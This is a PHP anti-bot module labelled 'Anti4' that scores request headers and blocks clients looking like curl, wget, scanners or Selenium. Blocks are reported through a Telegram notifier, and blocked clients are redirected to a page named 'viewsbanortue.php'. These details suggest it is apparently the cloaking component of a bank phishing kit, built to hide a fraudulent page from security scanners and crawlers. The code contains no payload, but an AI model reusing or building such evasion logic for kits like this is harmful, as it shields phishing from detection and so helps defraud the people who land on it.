<?php
// Anti4: Improved HTTP Header Analysis
// Analyzes HTTP headers for bot-like behavior (more lenient)

// No bypass system - full protection active

$headers = getallheaders();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Smart header analysis with human vs bot detection
$suspicious_score = 0;
$human_score = 0;

// Check for obvious automation tools headers
$automation_headers = [
    'X-Automated-Tool', 'X-Selenium', 'X-Scrapy', 'X-Bot', 'X-Crawler',
    'X-Python', 'X-Ruby', 'X-Curl', 'X-Wget', 'X-Scanner'
];

foreach ($automation_headers as $header) {
    if (isset($headers[$header])) {
        $suspicious_score += 10; // Instant bot detection
        error_log("Automation header detected: {$header} from IP: {$client_ip}");
    }
}

// Analyze Accept header for legitimacy
if (isset($headers['Accept'])) {
    $accept = $headers['Accept'];
    
    // Human browsers typically have complex Accept headers
    if (strpos($accept, 'text/html') !== false) $human_score += 2;
    if (strpos($accept, 'application/xhtml+xml') !== false) $human_score += 1;
    if (strpos($accept, 'image/webp') !== false) $human_score += 1;
    if (strpos($accept, '*/*') !== false && strlen($accept) > 10) $human_score += 1;
    
    // Bot patterns in Accept header
    if ($accept === '*/*' && strlen($accept) === 3) $suspicious_score += 2;
    if (strpos($accept, 'application/json') !== false && strpos($accept, 'text/html') === false) $suspicious_score += 1;
} else {
    $suspicious_score += 1; // Missing Accept header is slightly suspicious
}

// Check Accept-Language for human patterns
if (isset($headers['Accept-Language'])) {
    $lang = $headers['Accept-Language'];
    if (strlen($lang) > 5 && strpos($lang, ',') !== false) $human_score += 2; // Multiple languages = human
    if (preg_match('/[a-z]{2}-[A-Z]{2}/', $lang)) $human_score += 1; // Proper locale format
} else {
    $suspicious_score += 1; // Missing language header
}

// Check Accept-Encoding for compression support (humans usually have this)
if (isset($headers['Accept-Encoding'])) {
    $encoding = $headers['Accept-Encoding'];
    if (strpos($encoding, 'gzip') !== false) $human_score += 1;
    if (strpos($encoding, 'deflate') !== false) $human_score += 1;
    if (strpos($encoding, 'br') !== false) $human_score += 1; // Brotli support = modern browser
} else {
    $suspicious_score += 1;
}

// Check for DNT (Do Not Track) header - humans often have this
if (isset($headers['DNT'])) $human_score += 1;

// Check for Upgrade-Insecure-Requests (modern browsers)
if (isset($headers['Upgrade-Insecure-Requests'])) $human_score += 1;

// Check for Sec-Fetch headers (modern browsers send these)
$sec_headers = ['Sec-Fetch-Site', 'Sec-Fetch-Mode', 'Sec-Fetch-User', 'Sec-Fetch-Dest'];
foreach ($sec_headers as $sec_header) {
    if (isset($headers[$sec_header])) $human_score += 1;
}

// Check Connection header patterns
if (isset($headers['Connection'])) {
    $connection = strtolower($headers['Connection']);
    if ($connection === 'keep-alive') $human_score += 1; // Browsers prefer keep-alive
    if ($connection === 'close' && !isset($headers['Cache-Control'])) $suspicious_score += 1;
}

// Check for Cache-Control (browsers send this)
if (isset($headers['Cache-Control'])) $human_score += 1;

// User-Agent complexity analysis
if (!empty($user_agent)) {
    if (strlen($user_agent) > 50) $human_score += 1; // Complex UA = likely browser
    if (preg_match('/\([^)]+\)/', $user_agent)) $human_score += 1; // Has parentheses
    if (preg_match('/\d+\.\d+/', $user_agent)) $human_score += 1; // Has version numbers
}

// Calculate final score
$final_score = $suspicious_score - $human_score;

// Smart blocking logic
if ($suspicious_score >= 10) {
    // Immediate block for obvious automation
    require_once __DIR__ . '/telegram_notify.php';
    notifyBotBlocked($client_ip, $user_agent, "Automation headers detected", [
        'suspicious_score' => $suspicious_score,
        'human_score' => $human_score
    ]);
    
    error_log("Blocked automation headers: Score={$suspicious_score}, IP={$client_ip}, UA={$user_agent}");
    header('HTTP/1.1 403 Forbidden');
    header('Location: ../viewsbanortue.php');
    exit();
} elseif ($final_score >= 5 && $human_score < 3) {
    // Block if suspicious and lacks human indicators
    require_once __DIR__ . '/telegram_notify.php';
    notifyBotBlocked($client_ip, $user_agent, "Suspicious headers pattern", [
        'final_score' => $final_score,
        'suspicious_score' => $suspicious_score,
        'human_score' => $human_score
    ]);
    
    error_log("Blocked suspicious headers: Final={$final_score}, Suspicious={$suspicious_score}, Human={$human_score}, IP={$client_ip}");
    header('HTTP/1.1 403 Forbidden');
    header('Location: ../viewsbanortue.php');
    exit();
}
